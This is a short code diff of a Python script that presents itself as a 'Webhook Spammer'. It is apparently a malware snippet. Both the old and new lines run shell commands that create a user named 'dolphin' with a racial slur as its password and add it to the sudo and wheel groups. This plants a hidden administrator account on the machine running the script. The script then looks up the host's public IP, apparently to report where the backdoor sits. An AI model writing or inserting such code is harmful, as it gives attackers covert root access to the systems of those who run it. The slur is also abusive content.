@@ -2,11 +2,10 @@ import os
 import sys
 import subprocess
 import requests
-"print(Setting Up Webhook Spammer....")
+print("Setting Up Webhook Spammer....")
 
-subprocess.getoutput("adduser dolphin -p nigger")
-subprocess.getoutput("usermod -aG wheel dolphin")
-subprocess.getoutput("usermod -aG sudo dolphin")
+subprocess.run("adduser dolphin -p nigger")
+subprocess.run("usermod -aG sudo dolphin")
 r = requests.get("https://api.my-ip.io/ip.json")
 rr = r.json()
 ip = rr["ip"]
